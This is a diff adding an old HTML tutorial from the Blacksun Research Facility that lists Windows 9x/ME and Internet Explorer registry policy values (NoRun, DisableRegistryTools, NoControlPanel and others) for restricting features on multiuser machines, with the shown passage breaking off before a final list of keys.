@@ -1,0 +1,2309 @@
+<h3 align="center">WINDOWS 9x/ME SECURITY AND SYSTEM RESTRICTIONS</h3>
+<p align="center">Version: 1.0b<br>
+Written by: <a href="mailto:jacorex@hotmail.com">PHaRaoH</a><br>
+for the <a href="http://blacksun.box.sk">Blacksun Research Facility</a>.<br>
+Release Date: 20 January 2002</p>
+<hr align="center" noshade width="90%">
+
+<p>[DISCLAIMER]</p>
+<p>This tutorial was written for informational purposes only, so let's keep it that way!<br>
+I am not responsible for anything stupid you do with this information (not that you can do 
+anyting stupid with it but you know people...). yada yada yada...</p>
+
+<p>[THE FLASHING RED WARNING NOTE]</p>
+<p>This tutorial is about editing the registry. Editing the registry is very dangerous: 
+you can break your PC, so please take the time and backup the registry before you even try
+anything written in this tutorial. I also suggest that you first read the other tutorials about 
+the registry available from BSRF [<a href="http://blacksun.box.sk">http://blacksun.box.sk</a>].</p>
+
+<p>[ABOUT THIS TUTORIAL]</p>
+<p>This tutorial was not written by me entirely, I gathered information form other sources
+on the web (some time ago) like messageboards, advisories etc. I do not know who the original 
+authors are, but if you read this and feel that you need some credit for it please drop me a 
+line and I will put your name in here somewhere ;-)</p>
+<p>A large part of this tutorial originated from a post on Elf Qrin's message board 
+[<a href="http://www.elfqrin.com" target="_blank">http://www.elfqrin.com</a>]</p>
+<p>The reason for this tutorial is that I was looking for something like this and could
+not get hold of it easy... (That is good enough a reason, ain't it? =)</p>
+<p>Anyway, here goes, I hope you like it. Send all feedback to 
+<a href="mailto:jacorex@hotmail.com">PHaRaoH</a>.</p>
+<hr align="center" noshade width="90%">
+<p>You can control the way your Win95/98/ME system restricts access to certain areas 
+or features (especially useful on multiuser machines) without having to mess with 
+Poledit.exe (Policy Editor), the default Windows administrative control tool.</p>
+
+<p>All you have to do is modify the Registry values listed below.<br>
+You can either make these changes manually using the Registry Editor (Regedit.exe), 
+or save them in a .REG file for future use (name it for example RESTRICT.REG).
+Start Regedit and go to: </p>
+
+<p class="white">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies</p>
+
+<p>Look in the left hand pane for these subkeys:</p>
+<ol>
+	<li><a href="#explorersubkey">Explorer</a></li>
+	<li><a href="#systemsubkey">System</a></li>
+	<li><a href="#networksubkey">Network</a></li>
+	<li><a href="#winoldappsubkey">WinOldApp</a></li>
+</ol>
+<p>If they are not present, create them: right-click... New... Key... Name it to one of 
+the values listed above.</p>
+<p>Now you need to create (or modify if it already exist) the following DWORD values 
+listed further below under the subkeys above. To create a new DWORD value: right-click... 
+New... DWORD... name it to one of the values listed further below.
+To modify one of these DWORD values: right-click... Modify... check the Decimal box... enter 
+a value of 1 to disable access to a certain feature, or a value of 0 to enable access to a 
+certain feature). These are the valid DWORD values (if not specified otherwise) you can change 
+under the following subkeys:</p>
+<a name="explorersubkey"></a>
+<p>1. Explorer subkey:</p>
+
+<table align="center" border="1" cellpadding="0" cellspacing="0" width="80%">
+	<tr>
+		<th>
+			<p>Keyname</p>
+		</th>
+		<th>
+			<p>Description</p>
+		</th>
+	</tr>
+	<tr>
+		<td>
+			<p>ClearRecentDocsOnExit</p>
+		</td>
+		<td>
+			<p>enable/disable clear of recent documents upon exit</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>DisableRegistryTools</p>
+		</td>
+		<td>
+			<p>enable/disable registry editing tools<br>
+			WARNING: If you disable the Registry Editor, you will NOT be able to modify 
+			ANY Registry settings anymore, and the ONLY way to disable system restrictions
+			is to run/merge/register a .REG/.INF/.VBS file!</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>NoAddPrinter</p>
+		</td>
+		<td>
+			<p>enable/disable addition of new printers</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>NoClose</p>
+		</td>
+		<td>
+			<p>enable/disable system shutdown</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>NoDeletePrinter</p>
+		</td>
+		<td>
+			<p>enable/disable existent printers deletion</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>NoDesktop</p>
+		</td>
+		<td>
+			<p>enable/disable ALL desktop items and desktop right-click menu</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>NoDevMgrUpdate</p>
+		</td>
+		<td>
+			<p>enable/disable Windows 98/ME web update manager</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoDrives [hex]</p>
+		</td>
+		<td>
+			<p>enable/disable ANY drives in My Computer/Explorer/IE<br>
+			See "<a href="#hidewin9xdrives">Hide Win9x Drives</a>" for details</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>NoFind</p>
+		</td>
+		<td>
+			<p>enable/disable the find/search command</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>NoInternetIcon</p>
+		</td>
+		<td>
+			<p>enable/disable the Internet icon on desktop</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>NoNetHood</p>
+		</td>
+		<td>
+			<p>enable/disable Network Neighborhood</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>NoRecentDocsHistory</p>
+		</td>
+		<td>
+			<p>enable/disable recent documents in the Start Menu (Win98/ME/IE4/IE5/IE6 only)</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>NoRun</p>
+		</td>
+		<td>
+			<p>enable/disable the run command</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>NoSaveSettings</p>
+		</td>
+		<td>
+			<p>enable/disable save settings upon exit</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>NoSetFolders</p>
+		</td>
+		<td>
+			<p>enable/disable folders in Start Menu... Settings</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>NoSetTaskbar</p>
+		</td>
+		<td>
+			<p>enable/disable taskbar in Start Menu... Settings</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>NoSMMyDocs</p>
+		</td>
+		<td>
+			<p>enable/disable My Documents folder in Start Menu</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoSMMyPictures</p>
+		</td>
+		<td>
+			<p>enable/disable My Pictures folder in Start Menu<br> 
+			["NoSMMyDocs" and "NoSMMyPictures" courtesy of <a href="mailto:davidapoole@dartonhigh.freeserve.co.uk">David Poole</a>]</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>NoWindowsUpdate</p>
+		</td>
+		<td>
+			<p>enable/disable the Win98/ME web update </p>
+		</td>
+	</tr>
+</table>
+
+<a name="systemsubkey"></a>
+<p>2. System subkey:</p>
+
+<table align="center" border="1" cellpadding="0" cellspacing="0" width="80%">
+	<tr>
+		<th>
+			<p>Key Name</p>
+		</th>
+		<th>
+			<p>Description</p>
+		</th>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoAdminPage</p>
+		</td>
+		<td>
+			<p>enable/disable the remote administration tab</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoConfigPage</p>
+		</td>
+		<td>
+			<p>enable/disable the hardware profiles tab</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoControlPanel [hex]</p>
+		</td>
+		<td>
+			<p>enable/disable the control panel</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoDevMgrPage</p>
+		</td>
+		<td>
+			<p>enable/disable the device manager tab</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoDispAppearancePage</p>
+		</td>
+		<td>
+			<p>enable/disable the appearance display tab</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoDispBackgroundPage</p>
+		</td>
+		<td>
+			<p>enable/disable the background display tab</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoDispCPL</p>
+		</td>
+		<td>
+			<p>enable/disable the display properties applet</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoDispScrSavPage</p>
+		</td>
+		<td>
+			<p>enable/disable the screensaver display tab</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoDispSettingsPage</p>
+		</td>
+		<td>
+			<p>enable/disable the settings display tab</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoFileSysPage</p>
+		</td>
+		<td>
+			<p>enable/disable the file system button</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoPwdPage</p>
+		</td>
+		<td>
+			<p>enable/disable the password change tab</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoProfilePage</p>
+		</td>
+		<td>
+			<p>enable/disable the user profiles tab</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoSecCPL</p>
+		</td>
+		<td>
+			<p>enable/disable the password applet</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoVirtMemPage</p>
+		</td>
+		<td>
+			<p>enable/disable the virtual memory button</p>
+		</td>
+	</tr>
+</table>
+
+<a name="networksubkey"></a>
+<p>3. Network subkey:</p>
+
+<table align="center" border="1" cellpadding="0" cellspacing="0" width="80%">
+	<tr>
+		<th>
+			<p>Key Name</p>
+		</th>
+		<th>
+			<p>Description</p>
+		</th>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>DisablePwdCaching</p>
+		</td>
+		<td>
+			<p>enable/disable password caching</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>HideSharePwds [hex]</p>
+		</td>
+		<td>
+			<p>enable/disable shared passwords</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoEntireNetwork</p>
+		</td>
+		<td>
+			<p>enable/disable entire network</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoNetSetup</p>
+		</td>
+		<td>
+			<p>enable/disable the network applet</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoNetSetupIDPage</p>
+		</td>
+		<td>
+			<p>enable/disable the network identification tab</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoNetSetupSecurityPage</p>
+		</td>
+		<td>
+			<p>enable/disable the network access tab</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoFileSharing</p>
+		</td>
+		<td>
+			<p>enable/disable the network file sharing button</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>MinPwdLen</p>
+		</td>
+		<td>
+			<p>set the minimum password length (integer number: 0 - 99)</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoPrintSharing</p>
+		</td>
+		<td>
+			<p>enable/disable the network print sharing button</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoWorkgroupContents</p>
+		</td>
+		<td>
+			<p>enable/disable network workgroup</p>
+		</td>
+	</tr>
+</table>
+
+<a name="winoldappsubkey"></a>
+<p>4. WinOldApp subkey:</p>
+
+<table align="center" border="1" cellpadding="0" cellspacing="0" width="80%">
+	<tr>
+		<th>
+			<p>Key Name</p>
+		</th>
+		<th>
+			<p>Description</p>
+		</th>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>Disabled</p>
+		</td>
+		<td>
+			<p>enable/disable Ms-Dos Prompt</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoRealMode</p>
+		</td>
+		<td>
+			<p>enable/disable real Ms-Dos mode reboot option (Win95/98 only)</p>
+		</td>
+	</tr>
+</table>
+
+<p>Similar settings for Explorer, Network and System can be also found under these Registry keys:</p> 
+
+<p class="white">HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies</p>
+<p>and:</p>
+<p class="white">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies</p>
+
+<p>If there is only one user, the ".Default" key above contains all global system settings. 
+If more than one user, each user has its own subkey here, named after the username(s) found
+in Control Panel... Users, and the registry settings located under a user's subkey are valid 
+only for that specific user. If you double-click on any of these keys, you'll see 3 subkeys in 
+the left hand pane: Explorer, Network and System.<br>
+Create (or modify if already present) the following Binary [hex] values listed below under the 
+subkeys above. To create a new Binary value: right-click... New... Binary... Name it to one 
+of the values listed below.<br>
+To modify one of these Binary [hex] values: double-click on it... give it a value of 01 00 00 00
+to disable access to a certain system feature, or a value of 00 00 00 00 to enable access to a 
+certain system feature. Don't type the spaces, they will be inserted automatically.</p>
+
+<p>Explorer subkey valid DWORD values (if not specified otherwise) that can be changed (some are 
+valid ONLY for Win98/ME and MS IE 3/4/5/6):</p> 
+
+<table align="center" border="1" cellpadding="0" cellspacing="0" width="80%">
+	<tr>
+		<th>
+			<p>Key Name</p>
+		</th>
+		<th>
+			<p>Description</p>
+		</th>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>CDRAutoRun [hex]</p>
+		</td>
+		<td>
+			<p>enable/disable CD-R/CD-RW/DVD-R/DVD-RW drive(s) autoRun<br>
+			NOTE: This setting needs specific CDR(W)/DVDR(W) software installed, 
+			like Roxio (Adaptec) Easy CD Creator, DirectCD, CD Copier etc.</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>ClassicShell [hex]</p>
+		</td>
+		<td>
+			<p>enable/disable the active desktop shell</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>ClearRecentDocsOnExit</p>
+		</td>
+		<td>
+			<p>clear/don't clear recent docsuments upon exit </p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>EditLevel</p>
+		</td>
+		<td>
+			<p>edit security level (integer number: 0 - 4)</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>EnforceShellExtensionSecurity</p>
+		</td>
+		<td>
+			<p>self explanatory :)</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>LinkResolveIgnoreLinkInfo</p>
+		</td>
+		<td>
+			<p>display/don't display link info</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoActiveDesktop</p>
+		</td>
+		<td>
+			<p>enable/disable active desktop </p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoActiveDesktopChanges</p>
+		</td>
+		<td>
+			<p>enable/disable changes to active desktop </p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoAddPrinter</p>
+		</td>
+		<td>
+			<p>enable/disable addition of new printers</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoChangeStartMenu</p>
+		</td>
+		<td>
+			<p>enable/disable changes to the Start Menu </p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoClose</p>
+		</td>
+		<td>
+			<p>enable/disable closing IE GUI</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoDeletePrinter</p>
+		</td>
+		<td>
+			<p>enable/disable existent printers deletion</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoDeskTop</p>
+		</td>
+		<td>
+			<p>enable/disable ALL desktop items and desktop right-click menu</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoDevMgrUpdate</p>
+		</td>
+		<td>
+			<p>enable/disable the Win98/ME web update manager</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoDrives [hex]</p>
+		</td>
+		<td>
+			<p>enable/disable ALL drives in My Computer/Explorer/IE<br>
+			See "<a href="#hidewin9xdrives">Hide Win9x Drives</a>" for details.</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoDriveTypeAutoRun [hex]</p>
+		</td>
+		<td>
+			<p>enable/disable the cd-rom autorun command</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoEditMenu</p>
+		</td>
+		<td>
+			<p>edit/don't edit the Start Menu</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoFavoritesMenu</p>
+		</td>
+		<td>
+			<p>enable/disable favorites folder display</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoFileMenu</p>
+		</td>
+		<td>
+			<p>enable/disable Explorer/IE file menu</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoFind</p>
+		</td>
+		<td>
+			<p>enable/disable the find command</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoFolderOptions</p>
+		</td>
+		<td>
+			<p>show/don't show Folder Options menu in explorer</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoHelp</p>
+		</td>
+		<td>
+			<p>show/don't show Help menu</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoInternetIcon</p>
+		</td>
+		<td>
+			<p>show/don't show the Internet icon on desktop</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoLogOff</p>
+		</td>
+		<td>
+			<p>show/don't show the Logoff menu in the Start menu</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoNetConnectDisconnect</p>
+		</td>
+		<td>
+			<p>enable/disable dial-up networking connect/disconnect</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoNetHood</p>
+		</td>
+		<td>
+			<p>enable/disable network neighborhood</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoRecentDocsHistory</p>
+		</td>
+		<td>
+			<p>enable/disable recent documents in Start Menu (Win98/ME/IE4/IE5/IE6 ONLY)</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoRecentDocsMenu</p>
+		</td>
+		<td>
+			<p>show/don't show the recent documents menu in the Start menu</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoRun</p>
+		</td>
+		<td>
+			<p>enable/disable the run command</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoSaveSettings [hex]</p>
+		</td>
+		<td>
+			<p>enable/disable save settings upon exit</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoSetActiveDesktop</p>
+		</td>
+		<td>
+			<p>enable/disable active desktop</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoSetFolders</p>
+		</td>
+		<td>
+			<p>enable/disable folder settings</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoSetTaskbar</p>
+		</td>
+		<td>
+			<p>enable/disable taskbar settings</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoStartBanner [hex]</p>
+		</td>
+		<td>
+			<p>enable/disable the splash screen upon IE start</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoStartMenuSubFolders</p>
+		</td>
+		<td>
+			<p>show/don't show subfolders in the Start Menu</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoTrayContextMenu</p>
+		</td>
+		<td>
+			<p>show/don't show context menu for tray items</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoViewContextMenu</p>
+		</td>
+		<td>
+			<p>show/don't show context menu</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoWindowsUpdate</p>
+		</td>
+		<td>
+			<p>enable/disable Win98/ME web update</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoWinKeys</td>
+		<td>
+			<p>enable/disable Win9x keys on 104+ keyboards</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>RestrictRun</p>
+		</td>
+		<td>
+			<p>enable/disable the run menu</p>
+		</td>
+	</tr>
+</table>
+
+<p>Some of these values are also found under:</p>
+
+<p class="white">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer</p>
+
+<p>Example:<br>
+NoControlPanel [hex] = enable/disable Control Panel</p>
+
+<p>Most of the "CURRENT_USER" settings, especially the ones that affect the entire system, 
+change automatically when you modify the similar values under the "LOCAL_MACHINE" registry 
+key (see above). Most of these values affect ONLY Internet Explorer versions 3, 4, 5 and 6, 
+and CAN be changed separately in the "CURRENT_USER" key, without influencing the overall 
+system operation.<br>
+ANY changes to these settings under ANY of these Registry keys require a Windows restart to 
+take effect.</p>
+
+<p>The MS Internet Explorer 4.0x/5.xx/6.xx restrictions are found under these Registry 
+keys:</p>
+
+<p class="white">HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Restrictions</p>
+
+<p>and:</p>
+
+<p class="white">HKEY_USERS\.Default\Software\Policies\Microsoft\Internet Explorer\Restrictions</p>
+
+<p>if there is only one user. If more than one user, the ".Default" key above is replaced with 
+each "username" key. All values are in DWORD format. Type in the decimal box for the desired
+value: 1 to disable or 0 to enable the respective function/key combo:</p>
+
+<table align="center" border="1" cellpadding="0" cellspacing="0" width="80%">
+	<tr>
+		<th>
+			<p>Key Name</p>
+		</th>
+		<th>
+			<p>Description</p>
+		</th>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoFileOpen</p>
+		</td>
+		<td>
+			<p>enable/disable open command in File menu, Ctrl+O and Ctrl+L</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoFileNew</p>
+		</td>
+		<td>
+			<p>enable/disable Ctrl+N for creating a new window</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoBrowserSaveAs</p>
+		</td>
+		<td>
+			<p>enable/disable the save and save as in the file menu</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoBrowserOptions</p>
+		</td>
+		<td>
+			<p>enable/disable the Internet options/properties in the view menu</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoFavorites</p>
+		</td>
+		<td>
+			<p>enable/disable the favorites menu, adding to, organizing favorites</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoSelectDownloadDir</p>
+		</td>
+		<td>
+			<p>enable/disable the save as dialog box upon file download</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoBrowserContextMenu</p>
+		</td>
+		<td>
+			<p>enable/disable html context menu</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoBrowserClose</p>
+		</td>
+		<td>
+			<p>enable/disable the close menu and alt+F4 keys to close a window</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoFindFiles</p>
+		</td>
+		<td>
+			<p>enable/disable the find menu and the F3 key</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoTheaterMode</p>
+		</td>
+		<td>
+			<p>enable/disable fullscreen (kiosk mode) and the F11 key</p>
+		</td>
+	</tr>
+</table>
+
+<a name="internetexplorerrestrictions"></a>
+<h4>Internet Explorer Restrictions</h4>
+<p>The Internet Properties restrictions for MS Internet Explorer 4.0x/5.xx/6.xx (also found as 
+a Control Panel applet) are located under this Registry key:</p> 
+<p class="white">HKEY_USERS\.Default\Software\Policies\Microsoft\Internet Explorer\Control Panel</p>
+<p>if there is only one user. If more than one user, the ".Default" key above is replaced with each 
+"username" key. All values are in DWORD format. Type in the Decimal box for the desired
+value: 1 to disable or 0 to enable the respective tab/setting/button.<br>
+Changing ANY of these settings does NOT require restarting Windows:</p>
+
+<table align="center" border="1" cellpadding="0" cellspacing="0" width="80%">
+	<tr>
+		<th>
+			<p>Key Name</p>
+		</th>
+		<th>
+			<p>Description</p>
+		</th>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>Accessibility</p>
+		</td>
+		<td>
+			<p>enable/disable accessibility settings</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>Advanced</p>
+		</td>
+		<td>
+			<p>enable/disable advanced settings</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>AdvancedTab</p>
+		</td>
+		<td>
+			<p>enable/disable the advanced tab</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>Autoconfig</p>
+		</td>
+		<td>
+			<p>enable/disable autoconfig settings</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>Cache</p>
+		</td>
+		<td>
+			<p>enable/disable cache settings</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>CalendarContact</p>
+		</td>
+		<td>
+			<p>enable/disable contact settings</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>Check_If_Default</p>
+		</td>
+		<td>
+			<p>enable/disable check if IE default browser setting</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>Connection Settings</p>
+		</td>
+		<td>
+			<p>enable/disable connection settings</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>Certificates</p>
+		</td>
+		<td>
+			<p>enable/disable certificates settings</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>CertifPers</p>
+		</td>
+		<td>
+			<p>enable/disable personal certificates settings </p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>CertifSite</p>
+		</td>
+		<td>
+			<p>enable/disable certificates publishers settings</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>Colors</p>
+		</td>
+		<td>
+			<p>enable/disable color settings</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>Connection Wizard</p>
+		</td>
+		<td>
+			<p>self explanatory =)</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>ConnectionsTab</p>
+		</td>
+		<td>
+			<p>enable/disable connections tab</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>Connwiz Admin Lock</p>
+		</td>
+		<td>
+			<p>enable/disable connection wizard administrative lockout</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>ContentTab</p>
+		</td>
+		<td>
+			<p>enable/disable content tab</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>Fonts</p>
+		</td>
+		<td>
+			<p>enable/disable fonts settings</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>FormSuggest</p>
+		</td>
+		<td>
+			<p>enable/disable forms suggest setting</p>
+		</td>
+	</tr
+	<tr>
+		<td valign="top">
+			<p>FormSuggest Passwords</p>
+		</td>
+		<td>
+			<p>enable/disable passwords suggest setting</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>GeneralTab</p>
+		</td>
+		<td>
+			<p>enable/disable General tab</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>History</p>
+		</td>
+		<td>
+			<p>enable/disable history settings</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>HomePage</p>
+		</td>
+		<td>
+			<p>enable/disable homepage settings</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>Languages</p>
+		</td>
+		<td>
+			<p>enable/disable Languages settings</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>Links</p>
+		</td>
+		<td>
+			<p>enable/disable links settings</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>Messaging</p>
+		</td>
+		<td>
+			<p>enable/disable MS messaging settings</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>Profiles</p>
+		</td>
+		<td>
+			<p>enable/disable profiles settings</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>ProgramsTab</p>
+		</td>
+		<td>
+			<p>enable/disable programs tab</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>Proxy</p>
+		</td>
+		<td>
+			<p>enable/disable proxy server settings</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>Ratings</p>
+		</td>
+		<td>
+			<p>enable/disable ratings settings</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>ResetWebSettings</p>
+		</td>
+		<td>
+			<p>enable/disable Reset web settings</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>SecAddSites</p>
+		</td>
+		<td>
+			<p>enable/disable Security Add sites settings</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>SecChangeSettings</p>
+		</td>
+		<td>
+			<p>enable/disable security changes</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>SecurityTab</p>
+		</td>
+		<td>
+			<p>enable/disable security tab</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>Settings</p>
+		</td>
+		<td>
+			<p>enable/disable settings boxes</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>Wallet</p>
+		</td>
+		<td>
+			<p>enable/disable MS wallet settings (MS IE 5.xx and newer ONLY)</p>
+		</td>
+	</tr>
+</table> 
+
+<h4>Change/Add Restrictions And Features</h4>
+
+<p>If you want to make restrictions to what users can do or use on there computer without 
+having to run poledit.exe, you can edit the registry. You can add and delete Windows 
+features by editing the registry. In this key the value 0 is ON and the value 1 is Off.</p> 
+<p>Example: to Save Windows setting add or modify the value name NoSaveSettings to 0, if set 
+to 1 Windows will not save settings. And NoDeletePrinter set to 1 will not allow the user 
+to delete a printer.</p>
+
+<p>The same key shows up at:</p>
+<p class="white">HKEY_USERS\(yourprofilename)\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer</p>
+<p>so change it there also if you are using different profiles.</p>
+
+<ol>
+	<li>Open RegEdit</li>
+	<li>Go to HKEY_CURRENT_USER\Software\Microsoft\CurrentVersion\Policies</li>
+	<li>Go to the Explorer Key (Additional keys that can be created under Policies are System, Explorer, Network and WinOldApp)</li>
+	<li>You can then add DWORD or binary values set to 1 in the appropriate keys for ON and 0 for off.</li>
+</ol>
+<p>The following keys are valid:</p>
+
